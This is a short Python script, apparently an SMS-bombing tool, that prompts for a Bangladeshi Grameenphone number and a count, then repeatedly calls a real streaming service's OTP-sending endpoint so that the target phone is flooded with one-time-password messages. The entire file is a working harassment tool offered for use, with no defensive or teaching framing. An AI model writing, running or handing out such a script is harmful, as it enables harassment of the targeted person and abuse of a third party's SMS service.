import sys, time, os
message = ("Thsi Programme is made by \n Official Coder: Dsx")
for char in message:
	sys.stdout.write(char)
	sys.stdout.flush()
	time.sleep(0.1)

print("\nSuccessfully Loaded")

import requests
number = str(input("[>]Enter The GP Phone Number: "))
amount = int(input("[>]Enter Amount: "))
api = "https://stage.bioscopelive.com/en/login/send-otp?phone=88" + number + "&operator=bd-otp"
for i in range(amount):
	requests.get(api)
print(str(i + 1) + "SMS Sent")
